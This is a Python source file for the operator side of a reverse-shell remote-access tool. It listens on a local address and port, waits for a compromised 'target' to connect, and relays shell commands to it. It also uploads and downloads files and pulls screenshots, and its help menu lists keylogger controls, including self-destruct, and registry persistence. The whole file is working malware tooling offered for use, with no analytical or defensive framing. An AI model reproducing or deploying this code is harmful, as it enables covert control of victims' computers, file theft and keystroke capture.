import json, os, socket
from termcolor import colored

def reliable_recv():
    data = ''
    while True:
        try:
            # receive data from target
            chunk = target.recv(1024)
            # check if received data is empty
            if len(chunk) == 0:
                continue
            data += chunk.decode('utf-8')
            # check if data is a valid JSON object
            if data[-1] == '}' and '{' in data:
                return json.loads(data)
        except Exception as e:
            print(str(e))
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    count = 0
    while True:
        command = input(colored(f'* shell~{ip}: ', 'red'))
        reliable_send(command)
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' %(count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(colored(''' \n
            exit                                 --> exit
            clear                                --> clear
            cd <directory>                       --> move to other directory
            upload <file name>                   --> upload ur file to target
            download <file name>                 --> download file from target
            keylog_start                         --> start the keylogger
            keylog_dump                          --> print captured keystrokes
            keylog_stop                          --> stop and self destruct keylogger file
            persistence <regname> <file name>    --> create persistence in registry''', 'blue'))
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.122.1', 5555))
print(colored('[+] listening for connections', 'blue'))
sock.listen(5)
target, ip = sock.accept()
print(colored(f'[+] target connected from {str(ip)}', 'green'))

target_communication()